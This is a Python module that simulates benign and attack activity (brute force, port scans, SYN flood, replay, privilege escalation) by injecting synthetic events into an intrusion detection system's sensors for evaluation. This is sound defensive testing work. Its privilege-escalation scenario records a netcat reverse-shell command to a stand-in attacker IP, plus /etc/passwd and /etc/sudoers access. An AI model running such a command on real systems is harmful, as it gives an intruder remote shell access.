"""
attack_simulator.py
Generates reproducible benign and malicious activity for IDS evaluation.

Scenarios implemented:
  1. benign_traffic        — Normal background traffic
  2. brute_force_login     — SSH-style brute force on a single user
  3. port_scan             — Sequential port scan
  4. noise_injection       — Low-level noise to mask activity
  5. replay_attack         — Replayed benign payloads with slight modification
  6. sensor_failure        — Temporarily disables one sensor
  7. credential_stuffing   — Many usernames from same IP
  8. recon_then_bruteforce — Port scan followed by login brute-force (multi-step)
  9. syn_flood             — High-rate SYN packets
 10. slow_port_scan        — Slow stealth scan spread over time
"""

import time
import hashlib
import random
import threading
import logging
from network_sensor import network_sensor
from host_sensor import host_sensor

logger = logging.getLogger("ids.simulator")

ATTACKER_IP  = "10.0.0.99"
VICTIM_IP    = "127.0.0.1"
BENIGN_IPS   = ["192.168.1.10", "192.168.1.20", "192.168.1.30"]
USERS        = ["alice", "bob", "carol", "dave", "root", "admin", "ubuntu"]


def _sleep(seconds: float):
    """Interruptible sleep in small steps."""
    steps = max(1, int(seconds / 0.05))
    for _ in range(steps):
        time.sleep(seconds / steps)


# ── 1. Benign Traffic ──────────────────────────────────────────────────────────
def benign_traffic(duration: float = 10.0, rate: float = 0.5):
    """
    Simulate normal HTTP/HTTPS/DNS traffic from multiple clients.
    rate = connections per second.
    """
    logger.info(f"[SIM] Starting benign traffic for {duration}s")
    end = time.time() + duration
    ports = [80, 443, 53, 22, 8080]
    while time.time() < end:
        ip = random.choice(BENIGN_IPS)
        sport = random.randint(49152, 65535)
        dport = random.choice(ports)
        payload = f"GET / HTTP/1.1 from {ip}:{sport}"
        h = hashlib.md5(payload.encode()).hexdigest()[:8]
        network_sensor.inject_flow(ip, VICTIM_IP, sport, dport, "TCP",
                                    pkt_count=random.randint(1, 5),
                                    payload_hash=h)
        user = random.choice(USERS[:3])
        if random.random() < 0.1:
            host_sensor.record_login_attempt(user, success=True, src_ip=ip)
        _sleep(1.0 / rate)
    logger.info("[SIM] Benign traffic complete.")


# ── 2. Brute-Force Login ───────────────────────────────────────────────────────
def brute_force_login(target_user: str = "root", attempts: int = 20,
                       interval: float = 0.2, src_ip: str = ATTACKER_IP):
    logger.info(f"[SIM] Brute-force: {attempts} attempts on '{target_user}' from {src_ip}")
    for i in range(attempts):
        success = (i == attempts - 1) and random.random() < 0.3
        host_sensor.record_login_attempt(target_user, success=success, src_ip=src_ip)
        # also generate network noise
        network_sensor.inject_flow(src_ip, VICTIM_IP, random.randint(49152,65535), 22, "TCP")
        _sleep(interval)
    logger.info("[SIM] Brute-force complete.")


# ── 3. Port Scan ───────────────────────────────────────────────────────────────
def port_scan(n_ports: int = 100, interval: float = 0.05,
              src_ip: str = ATTACKER_IP):
    logger.info(f"[SIM] Port scan: {n_ports} ports from {src_ip}")
    ports = random.sample(range(1, 65535), n_ports)
    for port in ports:
        network_sensor.inject_flow(src_ip, VICTIM_IP,
                                    random.randint(49152, 65535), port, "TCP",
                                    pkt_count=1)
        _sleep(interval)
    logger.info("[SIM] Port scan complete.")


# ── 4. Noise Injection ────────────────────────────────────────────────────────
def noise_injection(duration: float = 8.0, src_ip: str = ATTACKER_IP):
    """
    Send random low-intensity events to mask malicious activity.
    Mixes benign-looking connections with occasional suspicious ones.
    """
    logger.info(f"[SIM] Noise injection for {duration}s from {src_ip}")
    end = time.time() + duration
    while time.time() < end:
        # Mix random ports (looks like benign browsing)
        dport = random.choice([80, 443, 8080, 53, 123, 25, 587, 110])
        network_sensor.inject_flow(src_ip, VICTIM_IP,
                                    random.randint(49152, 65535), dport, "TCP",
                                    pkt_count=random.randint(1, 3))
        _sleep(random.uniform(0.1, 0.5))
    logger.info("[SIM] Noise injection complete.")


# ── 5. Replay Attack ─────────────────────────────────────────────────────────
def replay_attack(src_ip: str = ATTACKER_IP, replays: int = 5):
    """
    Capture a benign payload hash, then replay it multiple times.
    """
    logger.info(f"[SIM] Replay attack: {replays} replays from {src_ip}")
    # Establish original
    original_payload = "GET /api/token HTTP/1.1\r\nAuthorization: Bearer abc123"
    h = hashlib.sha256(original_payload.encode()).hexdigest()[:16]
    network_sensor.inject_flow("192.168.1.10", VICTIM_IP, 55000, 443, "TCP",
                                pkt_count=3, payload_hash=h)
    _sleep(0.5)
    # Replay same hash from attacker IP
    for i in range(replays):
        network_sensor.inject_flow(src_ip, VICTIM_IP,
                                    random.randint(49152, 65535), 443, "TCP",
                                    pkt_count=3, payload_hash=h)
        _sleep(0.3)
    logger.info("[SIM] Replay attack complete.")


# ── 6. Sensor Failure Simulation ──────────────────────────────────────────────
def sensor_failure(sensor: str = "network", duration: float = 5.0):
    """
    Temporarily disable a sensor to simulate an attacker blinding one channel.
    While down, the remaining sensor still detects — alert capped at HIGH
    (single source). After restore, both sources active again.
    """
    from schema import Event, EventType, Severity
    from event_bus import bus

    logger.info(f"[SIM] Disabling {sensor}_sensor for {duration}s")

    if sensor == "network":
        target = network_sensor
    else:
        target = host_sensor

    target.enabled = False
    # Emit sensor-down event
    bus.publish(Event(
        event_type  = EventType.SENSOR_DOWN,
        source      = f"{sensor}_sensor",
        severity    = Severity.HIGH,
        description = f"{sensor.capitalize()} sensor has gone offline",
        metadata    = {"sensor": sensor},
    ))

    # During blackout, generate some attacks
    _sleep(duration / 2)
    if sensor == "network":
        # Only host can see brute force now
        brute_force_login(attempts=8, interval=0.1)
    else:
        # Only network can see port scan now
        port_scan(n_ports=30, interval=0.05)

    _sleep(duration / 2)

    # Restore
    target.enabled = True
    bus.publish(Event(
        event_type  = EventType.SENSOR_UP,
        source      = f"{sensor}_sensor",
        severity    = Severity.INFO,
        description = f"{sensor.capitalize()} sensor is back online",
        metadata    = {"sensor": sensor},
    ))
    logger.info(f"[SIM] {sensor}_sensor restored.")


# ── 7. Credential Stuffing ────────────────────────────────────────────────────
def credential_stuffing(src_ip: str = ATTACKER_IP, per_user: int = 3):
    """Try multiple different usernames from the same IP."""
    logger.info(f"[SIM] Credential stuffing from {src_ip}: {len(USERS)} users × {per_user}")
    for user in USERS:
        for _ in range(per_user):
            host_sensor.record_login_attempt(user, success=False, src_ip=src_ip)
            network_sensor.inject_flow(src_ip, VICTIM_IP,
                                        random.randint(49152, 65535), 22, "TCP")
            _sleep(0.15)
    logger.info("[SIM] Credential stuffing complete.")


# ── 8. Recon Then Brute-Force ─────────────────────────────────────────────────
def recon_then_bruteforce(src_ip: str = ATTACKER_IP):
    """
    Phase 1: port scan to find open ports.
    Phase 2: brute-force on discovered SSH port.
    Triggers RECONNAISSANCE_THEN_BRUTEFORCE multi-step rule → CRITICAL.
    """
    logger.info(f"[SIM] Recon-then-bruteforce from {src_ip}")
    port_scan(n_ports=50, interval=0.03, src_ip=src_ip)
    _sleep(0.5)
    brute_force_login(target_user="root", attempts=15,
                      interval=0.1, src_ip=src_ip)
    logger.info("[SIM] Recon-then-bruteforce complete.")


# ── 9. SYN Flood ──────────────────────────────────────────────────────────────
def syn_flood(src_ip: str = ATTACKER_IP, packets: int = 200,
              rate: float = 50.0):
    """Flood target with SYN packets at high rate."""
    logger.info(f"[SIM] SYN flood: {packets} packets at {rate}/s from {src_ip}")
    for _ in range(packets):
        network_sensor.inject_flow(src_ip, VICTIM_IP,
                                    random.randint(1024, 65535),
                                    random.choice([80, 443, 22, 8080]),
                                    "TCP", pkt_count=1)
        _sleep(1.0 / rate)
    logger.info("[SIM] SYN flood complete.")


# ── 10. Slow Port Scan ────────────────────────────────────────────────────────
def slow_port_scan(src_ip: str = ATTACKER_IP, n_ports: int = 60,
                    interval: float = 2.0):
    """Stealth scan — one port every few seconds to evade rate-based detection."""
    logger.info(f"[SIM] Slow port scan: {n_ports} ports, {interval}s intervals from {src_ip}")
    ports = random.sample(range(1, 10000), n_ports)
    for port in ports:
        network_sensor.inject_flow(src_ip, VICTIM_IP,
                                    random.randint(49152, 65535), port, "TCP",
                                    pkt_count=1)
        _sleep(interval)
    logger.info("[SIM] Slow port scan complete.")


# ── 11. Privilege Escalation ──────────────────────────────────────────────────
def privilege_escalation(username: str = "www-data", src_ip: str = ATTACKER_IP):
    """
    Simulate a post-compromise privilege escalation sequence:
    1. Attacker logs in as low-priv user
    2. Runs sudo/chmod to escalate
    3. Executes suspicious tool (netcat/python)
    Triggers HOST_PRIV_ESC rule -> PRIVILEGE_ESCALATION alert (HIGH).
    """
    logger.info(f"[SIM] Privilege escalation as '{username}' from {src_ip}")
    # Step 1: successful login as low-priv user
    host_sensor.record_login_attempt(username, success=True, src_ip=src_ip)
    _sleep(0.2)
    # Step 2: access sensitive file
    host_sensor.record_file_access(username, "/etc/passwd", mode="read", src_ip=src_ip)
    _sleep(0.2)
    # Step 3: run sudo to become root
    host_sensor.record_process_exec(username, "sudo", args="su -", src_ip=src_ip)
    _sleep(0.2)
    # Step 4: run suspicious process — this triggers the priv-esc pattern detection
    host_sensor.record_process_exec(username, "netcat", args="-e /bin/bash 10.0.0.99 4444", src_ip=src_ip)
    _sleep(0.2)
    # Step 5: attempt to modify sensitive file
    host_sensor.record_file_access(username, "/etc/sudoers", mode="write", src_ip=src_ip)
    logger.info("[SIM] Privilege escalation complete.")


# ── 12. Anomaly Corroboration ─────────────────────────────────────────────────
def anomaly_corroboration(src_ip: str = ATTACKER_IP):
    """
    Demonstrates STATISTICAL_ANOMALY_CORROBORATED (CRITICAL, two-source).

    The anomaly detector tracks failed_login_rate per entity as the rolling count
    of failures in the last 60s. To get a high z-score, we need:
      - Baseline: many observations near value=1 (mean ~1, low std)
      - Burst: single observation at value >> mean

    Phase 1: Inject 30 isolated single failures with gaps so the rolling 60s
             window only ever sees ~1 failure at a time. This builds mean ~1.
    Phase 2: Inject 15 rapid failures to push the rolling count to ~15-20,
             producing z >> 3.0 and triggering ANOMALY_STAT.
    The concurrent HOST_LOGIN_FAIL events satisfy the second source requirement,
    firing STATISTICAL_ANOMALY_CORROBORATED (CRITICAL).
    """
    logger.info(f"[SIM] Anomaly corroboration from {src_ip}")

    # Phase 1: build baseline of ~1 failure per observation window
    # Space failures > 60s apart so rolling count stays at 1.
    # We compress time by directly injecting into the anomaly detector's
    # stats, rather than waiting 60s per failure. We do this by calling
    # observe() with value=1 multiple times to build the baseline cheaply,
    # then let the real burst happen through the normal event pipeline.
    logger.info("[SIM] Phase 1: seeding anomaly baseline directly (30 obs, rate=1)...")
    from anomaly_detector import anomaly_detector as _ad
    for _ in range(30):
        _ad.observe("failed_login_rate", src_ip, 1.0)

    _sleep(0.2)

    # Phase 2: rapid burst through the real pipeline — this raises the actual
    # rolling count to ~15+, giving z-score >> 3.0
    logger.info("[SIM] Phase 2: rapid burst to spike anomaly and corroborate...")
    for _ in range(15):
        host_sensor.record_login_attempt("root", success=False, src_ip=src_ip)
        network_sensor.inject_flow(src_ip, VICTIM_IP,
                                    random.randint(49152, 65535), 22, "TCP")
        _sleep(0.05)

    _sleep(0.5)
    logger.info("[SIM] Anomaly corroboration complete.")